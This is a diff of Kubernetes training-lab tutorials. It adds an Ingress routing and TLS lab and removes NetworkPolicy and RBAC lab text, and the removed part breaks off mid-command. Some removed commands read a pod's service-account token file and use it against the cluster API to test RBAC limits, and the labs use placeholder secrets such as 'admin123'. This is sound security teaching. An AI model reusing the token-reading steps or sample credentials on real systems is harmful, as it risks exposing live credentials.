+kubectl patch secret db-credentials --patch '{"data":{"api-key":"'$(echo -n 'new-api-key-123' | base64)'"}}'
+
+    Verify the Secret update:
+
+kubectl describe secret db-credentials
+
+Task 5: Clean Up and Best Practices
+Subtask 5.1: View All Created Resources
+
+    List all ConfigMaps:
+
+kubectl get configmaps
+
+    List all Secrets:
+
+kubectl get secrets
+
+    List all Pods:
+
+kubectl get pods
+
+    List all Deployments:
+
+kubectl get deployments
+
+Subtask 5.2: Clean Up Resources
+
+    Delete the Pods:
+
+kubectl delete pod app-pod-env app-pod-secret app-pod-volumes
+
+    Delete the Deployment:
+
+kubectl delete deployment web-app-deployment
+
+    Delete ConfigMaps:
+
+kubectl delete configmap app-config app-properties
+
+    Delete Secrets:
+
+kubectl delete secret db-credentials file-credentials
+
+    Clean up local files:
+
+rm -f pod-with-configmap.yaml pod-with-secret.yaml pod-with-volumes.yaml deployment-with-config.yaml app.properties
+
+Key Concepts and Best Practices
+ConfigMaps vs Secrets
+
+ConfigMaps are used for: • Non-sensitive configuration data • Application settings • Configuration files • Environment-specific values
+
+Secrets are used for: • Sensitive information (passwords, tokens, keys) • TLS certificates • Docker registry credentials • API keys
+Security Considerations
+
+• Secrets are base64 encoded, not encrypted by default • Use RBAC to control access to Secrets • Consider using external secret management systems for production • Set appropriate file permissions when mounting Secrets • Avoid logging Secret values
+Performance Tips
+
+• ConfigMaps and Secrets have size limits (1MB) • Volume mounts are eventually consistent • Environment variables are set at container startup • Use subPath for mounting specific files
+Troubleshooting Common Issues
+Issue 1: Pod Not Starting
+
+Problem: Pod stuck in Pending or Error state
+
+Solution:
+
+kubectl describe pod <pod-name>
+kubectl logs <pod-name>
+
+Issue 2: ConfigMap/Secret Not Found
+
+Problem: Error mounting ConfigMap or Secret
+
+Solution:
+
+kubectl get configmaps
+kubectl get secrets
+# Ensure the referenced ConfigMap/Secret exists
+
+Issue 3: File Not Updated After ConfigMap Change
+
+Problem: Mounted files don't reflect ConfigMap updates
+
+Solution: • Wait up to 60 seconds for kubelet sync • Restart the Pod if immediate update is needed • Environment variables require Pod restart
+Conclusion
+
+In this lab, you have successfully:
+
+• Created ConfigMaps using both literal values and files to store non-sensitive configuration data • Created Secrets to securely store sensitive information like database credentials • Used ConfigMaps and Secrets as environment variables in Pods to configure applications • Mounted ConfigMaps and Secrets as files in containers for file-based configuration • Applied configuration to Deployments for scalable applications • Updated ConfigMaps and Secrets and observed how changes propagate to running containers
+
+Why This Matters:
+
+Configuration management is crucial for modern applications because it: • Separates configuration from code, making applications more portable • Enables environment-specific deployments without code changes • Improves security by keeping sensitive data separate from application code • Facilitates easier updates and configuration changes without rebuilding images • Supports the twelve-factor app methodology for cloud-native applications
+
+Understanding ConfigMaps and Secrets is essential for the Kubernetes and Cloud Native Associate (KCNA) certification and real-world Kubernetes deployments. These skills enable you to build secure, configurable, and maintainable applications in Kubernetes environments.
+
+
+
+
+Lab 14: Advanced HTTP/S Routing with Ingress
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Deploy multiple applications in a Kubernetes cluster • Configure Ingress controllers for HTTP/S traffic management • Implement path-based routing using Ingress resources • Secure applications with TLS certificates and SSL termination • Verify and troubleshoot Ingress routing rules • Understand the relationship between Services, Ingress, and external traffic
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (Pods, Services, Deployments) • Familiarity with YAML configuration files • Knowledge of HTTP/HTTPS protocols and routing concepts • Basic command-line interface experience • Understanding of DNS and domain name concepts
+Ready-to-Use Cloud Machines
+
+Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed and configured. Simply click Start Lab to access your environment. No need to build your own VM or install Kubernetes from scratch.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-installed • Minikube cluster ready for use • NGINX Ingress Controller available for installation • All necessary tools and dependencies
+Lab Tasks
+Task 1: Environment Setup and Preparation
+Subtask 1.1: Verify Kubernetes Cluster Status
+
+First, let's ensure your Kubernetes cluster is running properly.
+
+# Check cluster status
+kubectl cluster-info
+
+# Verify nodes are ready
+kubectl get nodes
+
+# Check if minikube is running
+minikube status
+
+If minikube is not running, start it:
+
+# Start minikube cluster
+minikube start --driver=docker
+
+# Enable ingress addon
+minikube addons enable ingress
+
+Subtask 1.2: Verify Ingress Controller Installation
+
+Check if the NGINX Ingress Controller is installed and running:
+
+# Check ingress controller pods
+kubectl get pods -n ingress-nginx
+
+# Verify ingress controller service
+kubectl get svc -n ingress-nginx
+
+If the ingress controller is not installed, enable it:
+
+# Enable ingress addon for minikube
+minikube addons enable ingress
+
+# Wait for ingress controller to be ready
+kubectl wait --namespace ingress-nginx \
+  --for=condition=ready pod \
+  --selector=app.kubernetes.io/component=controller \
+  --timeout=120s
+
+Task 2: Deploy Two Sample Applications
+Subtask 2.1: Create Application Namespaces
+
+Create separate namespaces for better organization:
+
+# Create namespace for applications
+kubectl create namespace web-apps
+
+Subtask 2.2: Deploy First Application (App1)
+
+Create the first application deployment and service:
+
+# Create app1-deployment.yaml
+cat > app1-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: app1-deployment
+  namespace: web-apps
+  labels:
+    app: app1
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: app1
+  template:
+    metadata:
+      labels:
+        app: app1
+    spec:
+      containers:
+      - name: app1
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        volumeMounts:
+        - name: html-volume
+          mountPath: /usr/share/nginx/html
+      volumes:
+      - name: html-volume
+        configMap:
+          name: app1-html
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app1-html
+  namespace: web-apps
+data:
+  index.html: |
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Application 1</title>
+        <style>
+            body { font-family: Arial, sans-serif; background-color: #e3f2fd; text-align: center; padding: 50px; }
+            h1 { color: #1976d2; }
+        </style>
+    </head>
+    <body>
+        <h1>Welcome to Application 1</h1>
+        <p>This is the first application served via Ingress path-based routing.</p>
+        <p>Path: /app1</p>
+    </body>
+    </html>
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: app1-service
+  namespace: web-apps
+spec:
+  selector:
+    app: app1
+  ports:
+  - port: 80
+    targetPort: 80
+  type: ClusterIP
+EOF
+
+# Apply the configuration
+kubectl apply -f app1-deployment.yaml
+
+Subtask 2.3: Deploy Second Application (App2)
+
+Create the second application deployment and service:
+
+# Create app2-deployment.yaml
+cat > app2-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: app2-deployment
+  namespace: web-apps
+  labels:
+    app: app2
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: app2
+  template:
+    metadata:
+      labels:
+        app: app2
+    spec:
+      containers:
+      - name: app2
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        volumeMounts:
+        - name: html-volume
+          mountPath: /usr/share/nginx/html
+      volumes:
+      - name: html-volume
+        configMap:
+          name: app2-html
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app2-html
+  namespace: web-apps
+data:
+  index.html: |
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Application 2</title>
+        <style>
+            body { font-family: Arial, sans-serif; background-color: #f3e5f5; text-align: center; padding: 50px; }
+            h1 { color: #7b1fa2; }
+        </style>
+    </head>
+    <body>
+        <h1>Welcome to Application 2</h1>
+        <p>This is the second application served via Ingress path-based routing.</p>
+        <p>Path: /app2</p>
+    </body>
+    </html>
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: app2-service
+  namespace: web-apps
+spec:
+  selector:
+    app: app2
+  ports:
+  - port: 80
+    targetPort: 80
+  type: ClusterIP
+EOF
+
+# Apply the configuration
+kubectl apply -f app2-deployment.yaml
+
+Subtask 2.4: Verify Application Deployments
+
+Check that both applications are running correctly:
+
+# Check deployments
+kubectl get deployments -n web-apps
+
+# Check pods
+kubectl get pods -n web-apps
+
+# Check services
+kubectl get svc -n web-apps
+
+# Verify pods are ready
+kubectl wait --for=condition=ready pod -l app=app1 -n web-apps --timeout=60s
+kubectl wait --for=condition=ready pod -l app=app2 -n web-apps --timeout=60s
+
+Task 3: Configure Ingress for Path-Based Routing
+Subtask 3.1: Create Basic Ingress Resource
+
+Create an Ingress resource that routes traffic based on URL paths:
+
+# Create ingress-basic.yaml
+cat > ingress-basic.yaml << 'EOF'
 apiVersion: networking.k8s.io/v1
 kind: Ingress
 metadata:
-  name: secure-app-ingress
-  namespace: frontend
+  name: web-apps-ingress
+  namespace: web-apps
   annotations:
+    nginx.ingress.kubernetes.io/rewrite-target: /
+    nginx.ingress.kubernetes.io/ssl-redirect: "false"
+spec:
+  ingressClassName: nginx
+  rules:
+  - host: myapps.local
+    http:
+      paths:
+      - path: /app1
+        pathType: Prefix
+        backend:
+          service:
+            name: app1-service
+            port:
+              number: 80
+      - path: /app2
+        pathType: Prefix
+        backend:
+          service:
+            name: app2-service
+            port:
+              number: 80
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: app1-service
+            port:
+              number: 80
+EOF
+
+# Apply the Ingress configuration
+kubectl apply -f ingress-basic.yaml
+
+Subtask 3.2: Verify Ingress Configuration
+
+Check the Ingress resource and get the external IP:
+
+# Check ingress resource
+kubectl get ingress -n web-apps
+
+# Get detailed ingress information
+kubectl describe ingress web-apps-ingress -n web-apps
+
+# Get minikube IP for testing
+minikube ip
+
+Subtask 3.3: Configure Local DNS Resolution
+
+Add entries to your local hosts file for testing:
+
+# Get minikube IP
+MINIKUBE_IP=$(minikube ip)
+echo "Minikube IP: $MINIKUBE_IP"
+
+# Add entry to hosts file (requires sudo)
+echo "$MINIKUBE_IP myapps.local" | sudo tee -a /etc/hosts
+
+# Verify the entry was added
+grep myapps.local /etc/hosts
+
+Subtask 3.4: Test Path-Based Routing
+
+Test the routing configuration using curl:
+
+# Test default path (should route to app1)
+curl -H "Host: myapps.local" http://$(minikube ip)/
+
+# Test app1 path
+curl -H "Host: myapps.local" http://$(minikube ip)/app1
+
+# Test app2 path
+curl -H "Host: myapps.local" http://$(minikube ip)/app2
+
+# Alternative testing using the domain name
+curl http://myapps.local/app1
+curl http://myapps.local/app2
+
+Task 4: Secure Ingress with TLS Certificate
+Subtask 4.1: Generate Self-Signed TLS Certificate
+
+Create a self-signed certificate for testing purposes:
+
+# Create private key
+openssl genrsa -out tls.key 2048
+
+# Create certificate signing request
+openssl req -new -key tls.key -out tls.csr -subj "/CN=myapps.local/O=myapps.local"
+
+# Generate self-signed certificate
+openssl x509 -req -days 365 -in tls.csr -signkey tls.key -out tls.crt
+
+# Verify certificate
+openssl x509 -in tls.crt -text -noout | head -20
+
+Subtask 4.2: Create Kubernetes TLS Secret
+
+Store the certificate and key in a Kubernetes secret:
+
+# Create TLS secret
+kubectl create secret tls myapps-tls-secret \
+  --cert=tls.crt \
+  --key=tls.key \
+  -n web-apps
+
+# Verify secret creation
+kubectl get secrets -n web-apps
+kubectl describe secret myapps-tls-secret -n web-apps
+
+Subtask 4.3: Update Ingress with TLS Configuration
+
+Modify the Ingress resource to include TLS configuration:
+
+# Create ingress-tls.yaml
+cat > ingress-tls.yaml << 'EOF'
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: web-apps-ingress
+  namespace: web-apps
+  annotations:
+    nginx.ingress.kubernetes.io/rewrite-target: /
     nginx.ingress.kubernetes.io/ssl-redirect: "true"
     nginx.ingress.kubernetes.io/force-ssl-redirect: "true"
 spec:
+  ingressClassName: nginx
   tls:
   - hosts:
-    - secure-app.local
-    secretName: secure-app-tls
+    - myapps.local
+    secretName: myapps-tls-secret
   rules:
-  - host: secure-app.local
+  - host: myapps.local
+    http:
+      paths:
+      - path: /app1
+        pathType: Prefix
+        backend:
+          service:
+            name: app1-service
+            port:
+              number: 80
+      - path: /app2
+        pathType: Prefix
+        backend:
+          service:
+            name: app2-service
+            port:
+              number: 80
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: app1-service
+            port:
+              number: 80
+EOF
+
+# Apply the updated Ingress configuration
+kubectl apply -f ingress-tls.yaml
+
+Subtask 4.4: Verify TLS Configuration
+
+Check that the TLS configuration is working:
+
+# Check ingress with TLS
+kubectl describe ingress web-apps-ingress -n web-apps
+
+# Wait for ingress to be ready
+sleep 30
+
+# Test HTTPS connection (ignore certificate warnings for self-signed cert)
+curl -k https://myapps.local/app1
+curl -k https://myapps.local/app2
+
+# Test HTTP redirect to HTTPS
+curl -v http://myapps.local/app1
+
+Task 5: Advanced Routing and Verification
+Subtask 5.1: Add Header-Based Routing
+
+Create an advanced Ingress configuration with additional routing rules:
+
+# Create ingress-advanced.yaml
+cat > ingress-advanced.yaml << 'EOF'
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: web-apps-ingress-advanced
+  namespace: web-apps
+  annotations:
+    nginx.ingress.kubernetes.io/rewrite-target: /
+    nginx.ingress.kubernetes.io/ssl-redirect: "true"
+    nginx.ingress.kubernetes.io/configuration-snippet: |
+      more_set_headers "X-Served-By: Kubernetes-Ingress";
+      more_set_headers "X-App-Version: 1.0";
+spec:
+  ingressClassName: nginx
+  tls:
+  - hosts:
+    - myapps.local
+    - api.myapps.local
+    secretName: myapps-tls-secret
+  rules:
+  - host: myapps.local
+    http:
+      paths:
+      - path: /app1
+        pathType: Prefix
+        backend:
+          service:
+            name: app1-service
+            port:
+              number: 80
+      - path: /app2
+        pathType: Prefix
+        backend:
+          service:
+            name: app2-service
+            port:
+              number: 80
+      - path: /
+        pathType: Prefix
+        backend:
+          service:
+            name: app1-service
+            port:
+              number: 80
+  - host: api.myapps.local
     http:
       paths:
       - path: /
         pathType: Prefix
         backend:
           service:
-            name: web-frontend
+            name: app2-service
             port:
               number: 80
-
-Apply the Ingress resource:
-
-kubectl apply -f secure-ingress.yaml
-
-Subtask 2.3: Configure Local DNS Resolution
-
-Add an entry to your local hosts file to resolve the domain:
-
-# Get the Ingress Controller's external IP
-kubectl get svc -n ingress-nginx
-
-# Add entry to hosts file (replace <EXTERNAL-IP> with actual IP)
-echo "<EXTERNAL-IP> secure-app.local" | sudo tee -a /etc/hosts
-
-Task 3: Verify Secure HTTPS Routing and Test Network Isolation
-Subtask 3.1: Test HTTPS Routing
-
-Verify that the Ingress is working with TLS termination:
-
-# Check Ingress status
-kubectl get ingress -n frontend
-
-# Test HTTPS connectivity
-curl -k https://secure-app.local
-
-# Test HTTP redirect to HTTPS
-curl -I http://secure-app.local
-
-Subtask 3.2: Test Network Policy Isolation
-
-Create test pods to verify network isolation:
-
-# Create a test pod in the frontend namespace
-kubectl run frontend-test --image=busybox --rm -it --restart=Never -n frontend -- /bin/sh
-
-Inside the frontend test pod:
-
-# This should work - frontend to backend
-wget -qO- http://api-backend.backend.svc.cluster.local
-
-# This should fail - frontend to database (blocked by policy)
-nc -zv db-server.database.svc.cluster.local 5432
-
-exit
-
-Create a test pod in an unlabeled namespace:
-
-# Create a new namespace without labels
-kubectl create namespace test-isolation
-
-# Create a test pod in the unlabeled namespace
-kubectl run isolation-test --image=busybox --rm -it --restart=Never -n test-isolation -- /bin/sh
-
-Inside the isolation test pod:
-
-# This should fail - unlabeled namespace to backend
-wget -qO- http://api-backend.backend.svc.cluster.local
-
-# This should fail - unlabeled namespace to database
-nc -zv db-server.database.svc.cluster.local 5432
-
-exit
-
-Subtask 3.3: Verify NetworkPolicy Rules
-
-Check the applied NetworkPolicies:
-
-# List all NetworkPolicies
-kubectl get networkpolicies --all-namespaces
-
-# Describe specific policies
-kubectl describe networkpolicy backend-network-policy -n backend
-kubectl describe networkpolicy database-network-policy -n database
-kubectl describe networkpolicy frontend-network-policy -n frontend
-
-Subtask 3.4: Test Certificate Validation
-
-Verify the certificate details:
-
-# Check certificate information
-openssl x509 -in tls.crt -text -noout
-
-# Test certificate with curl
-curl -vk https://secure-app.local 2>&1 | grep -A 10 "Server certificate"
-
-Troubleshooting Common Issues
-NetworkPolicy Not Working
-
-If NetworkPolicies are not blocking traffic as expected:
-
-# Check if your CNI plugin supports NetworkPolicies
-kubectl get nodes -o wide
-
-# Verify NetworkPolicy is applied
-kubectl get networkpolicy --all-namespaces
-
-# Check pod labels and namespace labels
-kubectl get namespaces --show-labels
-kubectl get pods --show-labels -n backend
-
-Ingress TLS Issues
-
-If HTTPS is not working properly:
-
-# Check Ingress Controller logs
-kubectl logs -n ingress-nginx -l app.kubernetes.io/name=ingress-nginx
-
-# Verify certificate secret
-kubectl describe secret secure-app-tls -n frontend
-
-# Check Ingress status
-kubectl describe ingress secure-app-ingress -n frontend
-
-DNS Resolution Problems
-
-If domain names are not resolving:
-
-# Test DNS resolution from within cluster
-kubectl run dns-test --image=busybox --rm -it --restart=Never -- nslookup secure-app.local
-
-# Check CoreDNS logs
-kubectl logs -n kube-system -l k8s-app=kube-dns
-
-Lab Validation
-Validation Checklist
-
-Verify your lab completion by checking the following:
-
-    NetworkPolicies Applied: All three NetworkPolicies are created and active
-    Network Isolation Working: Traffic is properly restricted between namespaces
-    TLS Certificate Created: SSL certificate is generated and stored as Kubernetes secret
-    Ingress with TLS: Ingress resource is configured with TLS termination
-    HTTPS Routing: Secure HTTPS traffic is properly routed to the frontend service
-    HTTP to HTTPS Redirect: HTTP requests are automatically redirected to HTTPS
-
-Final Verification Commands
-
-Run these commands to validate your setup:
-
-# Check all NetworkPolicies
-kubectl get networkpolicy --all-namespaces
-
-# Verify Ingress with TLS
-kubectl get ingress -n frontend
-
-# Test HTTPS endpoint
-curl -k -I https://secure-app.local
-
-# Verify certificate
-kubectl get secret secure-app-tls -n frontend
-
-Cleanup
-
-To clean up the lab environment:
-
-# Delete namespaces (this will delete all resources within them)
-kubectl delete namespace frontend backend database test-isolation
-
-# Remove hosts file entry
-sudo sed -i '/secure-app.local/d' /etc/hosts
-
-# Clean up certificate files
-rm -f tls.key tls.csr tls.crt
-rm -f backend-network-policy.yaml database-network-policy.yaml frontend-network-policy.yaml secure-ingress.yaml
-
-Conclusion
-
-In this lab, you have successfully:
-
-• Implemented NetworkPolicies to control Pod-to-Pod communication and create namespace-level network isolation • Deployed secure Ingress resources with TLS termination using SSL certificates • Configured HTTPS routing with automatic HTTP to HTTPS redirection • Tested and verified network security policies to ensure proper traffic restriction • Gained hands-on experience with Kubernetes security best practices for cluster networking
-
-This lab demonstrates critical security concepts for the Certified Kubernetes Security Specialist (CKS) certification. Network security is fundamental to protecting Kubernetes clusters in production environments. The skills you've learned here - including NetworkPolicy implementation, TLS certificate management, and secure Ingress configuration - are essential for maintaining secure, production-ready Kubernetes deployments.
-
-Understanding these networking security concepts helps you build defense-in-depth strategies, ensuring that even if one security layer is compromised, additional layers provide continued protection for your applications and data.
-
-
-
-
-Lab 2: Role-Based Access Control (RBAC) and Service Accounts
-Objectives
-
-By the end of this lab, you will be able to:
-
-• Understand the fundamentals of Kubernetes Role-Based Access Control (RBAC) • Create and configure custom Roles and RoleBindings to restrict namespace access • Set up custom Service Accounts with minimal required permissions • Test and verify API access restrictions using different service accounts • Implement security best practices for Kubernetes workload authentication • Troubleshoot common RBAC configuration issues
-Prerequisites
-
-Before starting this lab, you should have:
-
-• Basic understanding of Kubernetes concepts (Pods, Namespaces, Services) • Familiarity with kubectl command-line tool • Knowledge of YAML file structure and syntax • Understanding of Linux command-line operations • Completion of basic Kubernetes administration tasks
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-installed • Kubernetes cluster (single-node for lab purposes) • All necessary RBAC permissions for cluster administration • Text editors (nano, vim) for file editing
-Task 1: Create Roles and Role Bindings for Namespace Access Control
-Subtask 1.1: Create a Dedicated Namespace
-
-First, we'll create a dedicated namespace to demonstrate RBAC controls.
-
-    Create a new namespace called secure-app:
-
-kubectl create namespace secure-app
-
-    Verify the namespace creation:
-
-kubectl get namespaces
-
-You should see the secure-app namespace listed among the existing namespaces.
-Subtask 1.2: Create a Custom Role with Limited Permissions
-
-Now we'll create a Role that grants specific permissions within our namespace.
-
-    Create a Role definition file:
-
-nano pod-reader-role.yaml
-
-    Add the following YAML content:
-
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  namespace: secure-app
-  name: pod-reader
-rules:
-- apiGroups: [""]
-  resources: ["pods"]
-  verbs: ["get", "list", "watch"]
-- apiGroups: [""]
-  resources: ["pods/log"]
-  verbs: ["get", "list"]
-
-    Apply the Role configuration:
-
-kubectl apply -f pod-reader-role.yaml
-
-    Verify the Role creation:
-
-kubectl get roles -n secure-app
-
-Subtask 1.3: Create a User Account for Testing
-
-For demonstration purposes, we'll create a certificate-based user account.
-
-    Generate a private key for the user:
-
-openssl genrsa -out developer.key 2048
-
-    Create a certificate signing request:
-
-openssl req -new -key developer.key -out developer.csr -subj "/CN=developer/O=development"
-
-    Create a CertificateSigningRequest resource:
-
-cat <<EOF | kubectl apply -f -
-apiVersion: certificates.k8s.io/v1
-kind: CertificateSigningRequest
-metadata:
-  name: developer-csr
-spec:
-  request: $(cat developer.csr | base64 | tr -d '\n')
-  signerName: kubernetes.io/kube-apiserver-client
-  usages:
-  - client auth
 EOF
 
-    Approve the certificate request:
+# Apply the advanced configuration
+kubectl apply -f ingress-advanced.yaml
 
-kubectl certificate approve developer-csr
+Subtask 5.2: Update DNS Configuration
 
-    Extract the signed certificate:
+Add the new subdomain to your hosts file:
 
-kubectl get csr developer-csr -o jsonpath='{.status.certificate}' | base64 -d > developer.crt
+# Add API subdomain
+MINIKUBE_IP=$(minikube ip)
+echo "$MINIKUBE_IP api.myapps.local" | sudo tee -a /etc/hosts
 
-Subtask 1.4: Create a RoleBinding
+# Verify both entries
+grep myapps.local /etc/hosts
 
-Now we'll bind our custom role to the developer user within the secure-app namespace.
+Subtask 5.3: Test Advanced Routing
 
-    Create a RoleBinding definition file:
+Test the advanced routing configuration:
 
-nano pod-reader-binding.yaml
+# Test main domain paths
+curl -k -I https://myapps.local/app1
+curl -k -I https://myapps.local/app2
 
-    Add the following YAML content:
+# Test API subdomain
+curl -k -I https://api.myapps.local/
 
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: pod-reader-binding
-  namespace: secure-app
-subjects:
-- kind: User
-  name: developer
-  apiGroup: rbac.authorization.k8s.io
-roleRef:
-  kind: Role
-  name: pod-reader
-  apiGroup: rbac.authorization.k8s.io
+# Check custom headers
+curl -k -I https://myapps.local/app1 | grep "X-Served-By"
+curl -k -I https://myapps.local/app1 | grep "X-App-Version"
 
-    Apply the RoleBinding configuration:
+Subtask 5.4: Monitor Ingress Logs
 
-kubectl apply -f pod-reader-binding.yaml
+Check the Ingress controller logs to verify traffic routing:
 
-    Verify the RoleBinding creation:
+# Get ingress controller pod name
+INGRESS_POD=$(kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
 
-kubectl get rolebindings -n secure-app
+# View ingress controller logs
+kubectl logs -n ingress-nginx $INGRESS_POD --tail=50
 
-Task 2: Configure Custom Service Account with Minimal Permissions
-Subtask 2.1: Create a Custom Service Account
+# Follow logs in real-time (run in separate terminal)
+kubectl logs -n ingress-nginx $INGRESS_POD -f
 
-Service accounts provide an identity for processes running in Pods.
+Task 6: Verification and Testing
+Subtask 6.1: Comprehensive Testing Script
 
-    Create a custom service account:
+Create a comprehensive testing script:
 
-kubectl create serviceaccount app-service-account -n secure-app
+# Create test-ingress.sh
+cat > test-ingress.sh << 'EOF'
+#!/bin/bash
 
-    Verify the service account creation:
+echo "=== Ingress Testing Script ==="
+echo "Testing HTTP/HTTPS routing and SSL termination"
+echo
 
-kubectl get serviceaccounts -n secure-app
+# Test HTTP redirect to HTTPS
+echo "1. Testing HTTP to HTTPS redirect:"
+curl -s -o /dev/null -w "HTTP Status: %{http_code}, Redirect URL: %{redirect_url}\n" http://myapps.local/app1
+echo
 
-Subtask 2.2: Create a Minimal Permission Role for the Service Account
+# Test HTTPS app1
+echo "2. Testing HTTPS app1 path:"
+curl -k -s https://myapps.local/app1 | grep -o "<title>.*</title>"
+echo
 
-We'll create a role with very limited permissions for our application.
+# Test HTTPS app2
+echo "3. Testing HTTPS app2 path:"
+curl -k -s https://myapps.local/app2 | grep -o "<title>.*</title>"
+echo
 
-    Create a minimal role definition file:
+# Test API subdomain
+echo "4. Testing API subdomain:"
+curl -k -s https://api.myapps.local/ | grep -o "<title>.*</title>"
+echo
 
-nano app-minimal-role.yaml
+# Test SSL certificate
+echo "5. Testing SSL certificate:"
+echo | openssl s_client -servername myapps.local -connect $(minikube ip):443 2>/dev/null | openssl x509 -noout -subject
+echo
 
-    Add the following YAML content:
+# Test custom headers
+echo "6. Testing custom headers:"
+curl -k -s -I https://myapps.local/app1 | grep "X-Served-By"
+curl -k -s -I https://myapps.local/app1 | grep "X-App-Version"
+echo
 
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  namespace: secure-app
-  name: app-minimal-role
-rules:
-- apiGroups: [""]
-  resources: ["configmaps"]
-  verbs: ["get"]
-- apiGroups: [""]
-  resources: ["secrets"]
-  verbs: ["get"]
-  resourceNames: ["app-secret"]
+echo "=== Testing Complete ==="
+EOF
 
-    Apply the minimal role configuration:
+# Make script executable
+chmod +x test-ingress.sh
 
-kubectl apply -f app-minimal-role.yaml
+# Run the test script
+./test-ingress.sh
 
-Subtask 2.3: Bind the Service Account to the Minimal Role
+Subtask 6.2: Verify Ingress Resources
 
-    Create a RoleBinding for the service account:
+Check all Ingress-related resources:
 
-nano app-service-binding.yaml
+# List all ingress resources
+kubectl get ingress --all-namespaces
 
-    Add the following YAML content:
+# Check ingress class
+kubectl get ingressclass
 
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: app-service-binding
-  namespace: secure-app
-subjects:
-- kind: ServiceAccount
-  name: app-service-account
-  namespace: secure-app
-roleRef:
-  kind: Role
-  name: app-minimal-role
-  apiGroup: rbac.authorization.k8s.io
+# Verify services are accessible
+kubectl get endpoints -n web-apps
 
-    Apply the service account binding:
+# Check pod status
+kubectl get pods -n web-apps -o wide
 
-kubectl apply -f app-service-binding.yaml
+Subtask 6.3: Performance and Load Testing
 
-Subtask 2.4: Create Test Resources
+Perform basic load testing to verify routing performance:
 
-Let's create some resources to test our permissions.
+# Install apache2-utils for ab command (if not available)
+sudo apt-get update && sudo apt-get install -y apache2-utils
 
-    Create a ConfigMap:
+# Perform load test on app1
+ab -n 100 -c 10 -k https://myapps.local/app1
 
-kubectl create configmap app-config --from-literal=database_url=localhost:5432 -n secure-app
-
-    Create a Secret:
-
-kubectl create secret generic app-secret --from-literal=api_key=super-secret-key -n secure-app
-
-    Create another Secret (for testing restrictions):
-
-kubectl create secret generic restricted-secret --from-literal=admin_password=admin123 -n secure-app
-
-Task 3: Test API Access with Different Service Accounts
-Subtask 3.1: Create Test Pods with Different Service Accounts
-
-    Create a Pod using the default service account:
-
-nano default-sa-pod.yaml
-
-    Add the following YAML content:
-
-apiVersion: v1
-kind: Pod
-metadata:
-  name: default-sa-pod
-  namespace: secure-app
-spec:
-  serviceAccountName: default
-  containers:
-  - name: test-container
-    image: nginx:1.21
-    command: ["sleep", "3600"]
-
-    Create a Pod using the custom service account:
-
-nano custom-sa-pod.yaml
-
-    Add the following YAML content:
-
-apiVersion: v1
-kind: Pod
-metadata:
-  name: custom-sa-pod
-  namespace: secure-app
-spec:
-  serviceAccountName: app-service-account
-  containers:
-  - name: test-container
-    image: nginx:1.21
-    command: ["sleep", "3600"]
-
-    Apply both Pod configurations:
-
-kubectl apply -f default-sa-pod.yaml
-kubectl apply -f custom-sa-pod.yaml
-
-    Wait for Pods to be ready:
-
-kubectl wait --for=condition=Ready pod/default-sa-pod -n secure-app --timeout=60s
-kubectl wait --for=condition=Ready pod/custom-sa-pod -n secure-app --timeout=60s
-
-Subtask 3.2: Test API Access from Default Service Account Pod
-
-    Install curl in the default service account Pod:
-
-kubectl exec -it default-sa-pod -n secure-app -- apt-get update && apt-get install -y curl
-
-    Test accessing the Kubernetes API from inside the Pod:
-
-kubectl exec -it default-sa-pod -n secure-app -- bash -c '
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/pods
-'
-
-Expected Result: The default service account should have limited access and may receive a 403 Forbidden error.
-Subtask 3.3: Test API Access from Custom Service Account Pod
-
-    Install curl in the custom service account Pod:
-
-kubectl exec -it custom-sa-pod -n secure-app -- apt-get update && apt-get install -y curl
-
-    Test accessing allowed resources (ConfigMaps):
-
-kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/configmaps
-'
-
-    Test accessing allowed secrets (app-secret):
-
-kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/secrets/app-secret
-'
-
-    Test accessing restricted secrets (should fail):
-
-kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
